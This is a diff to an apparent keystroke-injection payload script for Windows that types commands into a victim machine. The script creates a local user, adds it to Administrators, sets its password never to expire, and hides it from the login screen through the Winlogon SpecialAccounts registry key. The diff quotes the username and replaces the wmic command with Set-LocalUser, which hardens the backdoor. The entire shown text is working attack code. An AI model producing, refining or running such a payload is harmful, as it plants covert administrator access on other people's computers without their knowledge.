@@ -26,22 +26,22 @@ PLATFORM WIN
   ENTER
   DELAY 1000
   # Create the local user account
-  STRING net user {{USERNAME}} "{{PASSWORD}}" /add
+  STRING net user "{{USERNAME}}" "{{PASSWORD}}" /add
   ENTER
   DELAY 500
   # Add the account to the local Administrators group
-  STRING net localgroup Administrators {{USERNAME}} /add
+  STRING net localgroup Administrators "{{USERNAME}}" /add
   ENTER
   DELAY 500
   # Set password to never expire so the account doesn't lock out
-  STRING wmic useraccount where "Name='{{USERNAME}}'" set PasswordExpires=FALSE
+  STRING Set-LocalUser -Name '{{USERNAME}}' -PasswordNeverExpires $true
   ENTER
   DELAY 500
   # Hide account from the Windows login screen (SpecialAccounts\UserList DWORD=0)
   # This key requires HKLM write access (admin) but only affects the login UI
-  STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v {{USERNAME}} /t REG_DWORD /d 0 /f
+  STRING reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "{{USERNAME}}" /t REG_DWORD /d 0 /f
   ENTER
   DELAY 500
   # Verify the account exists and is in Administrators
-  STRING net user {{USERNAME}}
+  STRING net user "{{USERNAME}}"
   ENTER
